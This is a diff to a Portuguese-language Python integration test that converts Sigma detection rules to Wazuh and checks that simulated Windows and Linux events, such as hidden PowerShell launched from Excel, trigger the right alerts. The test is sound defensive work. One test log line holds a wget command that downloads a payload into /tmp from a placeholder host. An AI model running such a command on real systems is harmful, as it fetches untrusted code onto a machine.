@@ -13,6 +13,7 @@ import sys
 import time
 import uuid
 from pathlib import Path
+from xml.sax.saxutils import escape
 
 import urllib3
 
@@ -63,6 +64,26 @@ detection:
   condition: palavras
 level: high
 """
+REGRA_CAMINHO_EXATO = r"""
+title: Caminho exato com barra
+id: 0b4a4a2e-1111-4c1c-9d2e-000000000004
+status: test
+logsource: {category: process_creation, product: windows}
+detection:
+  selecao: {Image: 'C:\Temp\roarexato.exe'}
+  condition: selecao
+level: high
+"""
+REGRA_REGEX = r"""
+title: Regex com barra
+id: 0b4a4a2e-1111-4c1c-9d2e-000000000005
+status: test
+logsource: {category: process_creation, product: windows}
+detection:
+  selecao: {Image|re: '^C:\\Temp[\\/]roarregex[a-z]+\.exe$'}
+  condition: selecao
+level: high
+"""
 INCONVERTIVEL = """
 title: Compara numero
 status: test
@@ -72,6 +93,16 @@ detection:
   condition: s
 level: low
 """
+# Evento de Windows que não casa regra nenhuma não gera alerta, e aí nada prova que ele foi
+# avaliado. A sentinela tem nível menor que as regras em teste: só aparece se todas calaram.
+SENTINELA = """<group name="teste,">
+  <rule id="199001" level="3">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.processGuid">^marca</field>
+    <description>Sentinela do Sysmon</description>
+  </rule>
+</group>
+"""
 
 
 def registrar(nome, passou, detalhe=""):
@@ -79,20 +110,28 @@ def registrar(nome, passou, detalhe=""):
     print(f"[{'PASSOU' if passou else 'FALHOU'}] {nome}" + (f": {detalhe}" if detalhe else ""), flush=True)
 
 
+def _evento_windows(provedor, evento, canal, nivel, palavras, mensagem, dados):
+    """O agente manda o XML do evento e é o gerenciador que o decodifica para win.*: um JSON já pronto é descartado."""
+    # Aspas simples nos atributos, como no Windows: o decodificador do Wazuh não lê as duplas.
+    campos = "".join(f"<Data Name='{k}'>{escape(v)}</Data>" for k, v in dados.items() if v is not None)
+    xml = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
+           f"<Provider Name='{provedor}'/><EventID>{evento}</EventID><Version>0</Version><Level>{nivel}</Level>"
+           f"<Task>0</Task><Opcode>0</Opcode><Keywords>{palavras}</Keywords>"
+           "<TimeCreated SystemTime='2026-11-01T12:00:00.000000000Z'/><EventRecordID>1</EventRecordID><Correlation/>"
+           f"<Execution ProcessID='1' ThreadID='2'/><Channel>{escape(canal)}</Channel><Computer>PC1</Computer><Security/>"
+           f"</System><EventData>{campos}</EventData></Event>")
+    return json.dumps({"Message": mensagem, "Event": xml})
+
+
 def sysmon(imagem, pai, linha, usuario="EMPRESA\\maria", marca=""):
-    return json.dumps({"win": {
-        "system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational",
-                   "severityValue": "INFORMATION", "message": "Process Create", "computer": "PC1"},
-        "eventdata": {"image": imagem, "parentImage": pai, "commandLine": linha, "user": usuario, "processGuid": marca},
-    }})
+    return _evento_windows("Microsoft-Windows-Sysmon", 1, "Microsoft-Windows-Sysmon/Operational", 4, "0x8000000000000000",
+                           "Process Create", {"Image": imagem, "ParentImage": pai, "CommandLine": linha, "User": usuario,
+                                              "ProcessGuid": marca})
 
 
 def seguranca(evento, marca=""):
-    return json.dumps({"win": {
-        "system": {"providerName": "Microsoft-Windows-Security-Auditing", "eventID": str(evento), "channel": "Security",
-                   "severityValue": "AUDIT_SUCCESS", "message": "Evento", "computer": "PC1"},
-        "eventdata": {"targetUserName": marca},
-    }})
+    return _evento_windows("Microsoft-Windows-Security-Auditing", evento, "Security", 0, "0x8020000000000000",
+                           "Evento", {"TargetUserName": marca})
 
 
 INJETOR = """
@@ -145,9 +184,9 @@ def main():
         print("   formato real da regra:", json.dumps({k: amostra.get(k) for k in ("id", "level", "groups", "mitre", "pci_dss", "gdpr", "hipaa", "nist_800_53", "tsc", "gpg13", "filename", "status")}, ensure_ascii=False)[:600], flush=True)
 
         print("\n== Regras de exemplo", flush=True)
-        exemplos = converter_textos([REGRA_POWERSHELL, REGRA_OU, REGRA_LINUX, INCONVERTIVEL])
-        registrar("três regras convertem", all(r.xml for r in exemplos[:3]), str([len(r.xml) for r in exemplos]))
-        registrar("o que não dá para expressar é recusado com motivo", not exemplos[3].xml and exemplos[3].motivo, exemplos[3].motivo)
+        exemplos = converter_textos([REGRA_POWERSHELL, REGRA_OU, REGRA_LINUX, REGRA_CAMINHO_EXATO, REGRA_REGEX, INCONVERTIVEL])
+        registrar("cinco regras convertem", all(r.xml for r in exemplos[:5]), str([len(r.xml) for r in exemplos]))
+        registrar("o que não dá para expressar é recusado com motivo", not exemplos[5].xml and exemplos[5].motivo, exemplos[5].motivo)
 
         extras = []
         if "--base" in sys.argv:
@@ -165,13 +204,13 @@ def main():
         registrar("regex inválido é recusado na validação", not aceito, json.dumps(detalhe)[:200])
         registrar("gerenciador segue válido depois da recusa", provisao._configuracao_valida(g["id"])[0])
 
-        xml = arquivo_de_regras(exemplos)
+        xml = arquivo_de_regras(exemplos) + SENTINELA
         aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", xml)
         registrar("configuração válida com as regras de exemplo", aceito, json.dumps(detalhe)[:400])
         time.sleep(30)
         registrar("gerenciador volta depois de carregar", esperar_gerenciador(g, 240))
         total = api_do(g, "GET", "/rules", params={"group": "sigma", "limit": 1})["data"]["total_affected_items"]
-        registrar("regras de exemplo carregadas", total == 3, f"{total} regras")
+        registrar("regras de exemplo carregadas", total == 5, f"{total} regras")
 
         print("\n== Dispara quando deve e cala quando deve", flush=True)
         titulo = "PowerShell escondido iniciado pelo Excel"
@@ -186,7 +225,7 @@ def main():
         registrar("ataque dispara a regra convertida", titulo in descricoes, str(descricoes))
         tecnicas = [t for a in alertas for t in a["rule"].get("mitre", {}).get("id", [])]
         registrar("técnica MITRE chega ao alerta", "T1059.001" in tecnicas, str(tecnicas))
-        # Só vale se o evento gerou algum alerta: senão não prova que a regra calou.
+        # Só vale se o evento gerou algum alerta, o da sentinela: senão não prova que a regra calou.
         descricoes, _ = processo(powershell, "C:\\Windows\\explorer.exe", "powershell -w hidden")
         registrar("outro processo pai não dispara", descricoes and titulo not in descricoes, str(descricoes))
         descricoes, _ = processo(powershell, excel, "powershell -w minimized")
@@ -197,13 +236,23 @@ def main():
                                  "c:\\program files\\office\\excel.exe", "POWERSHELL -W HIDDEN")
         registrar("não diferencia maiúsculas, como o Sigma", titulo in descricoes, str(descricoes))
 
+        descricoes, _ = processo("C:\\Temp\\roarexato.exe", "C:\\Windows\\explorer.exe", "roarexato")
+        registrar("caminho exato com barra dispara", "Caminho exato com barra" in descricoes, str(descricoes))
+        descricoes, _ = processo("C:\\Temp\\sub\\roarexato.exe", "C:\\Windows\\explorer.exe", "roarexato")
+        registrar("outro caminho não dispara", descricoes and "Caminho exato com barra" not in descricoes, str(descricoes))
+        descricoes, _ = processo("C:\\Temp\\roarregexabc.exe", "C:\\Windows\\explorer.exe", "roarregex")
+        registrar("regex com barra dispara", "Regex com barra" in descricoes, str(descricoes))
+        descricoes, _ = processo("C:\\Temp\\roarregex1.exe", "C:\\Windows\\explorer.exe", "roarregex")
+        registrar("regex com barra não dispara em outro nome", descricoes and "Regex com barra" not in descricoes, str(descricoes))
+
         for evento in (4720, 4726):
             marca = f"marca{uuid.uuid4().hex}"
             descricoes, _ = regra_disparada(g, seguranca(evento, marca), marca)
             registrar(f"evento {evento} dispara o ramo do OU", "Conta criada ou apagada" in descricoes, str(descricoes))
         marca = f"marca{uuid.uuid4().hex}"
         descricoes, _ = regra_disparada(g, seguranca(4624, marca), marca, espera=10)
-        registrar("outro evento não dispara", "Conta criada ou apagada" not in descricoes, str(descricoes))
+        # O 4624 tem regra própria no Wazuh, o que prova que o evento foi avaliado.
+        registrar("outro evento não dispara", descricoes and "Conta criada ou apagada" not in descricoes, str(descricoes))
 
         marca = f"marca{uuid.uuid4().hex}"
         linha = f"Nov  1 12:00:00 servidor bash[1]: wget -O /tmp/roarcarga http://exemplo.test/{marca}"
@@ -217,7 +266,7 @@ def main():
         if extras:
             print("\n== Base pública inteira", flush=True)
             inicio = time.monotonic()
-            aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", arquivo_de_regras(exemplos + extras))
+            aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", arquivo_de_regras(exemplos + extras) + SENTINELA)
             registrar("configuração válida com a base inteira", aceito, json.dumps(detalhe)[:300])
             registrar("gerenciador volta com a base inteira", esperar_gerenciador(g, 300), f"{time.monotonic() - inicio:.0f}s")
             total = api_do(g, "GET", "/rules", params={"group": "sigma", "limit": 1})["data"]["total_affected_items"]
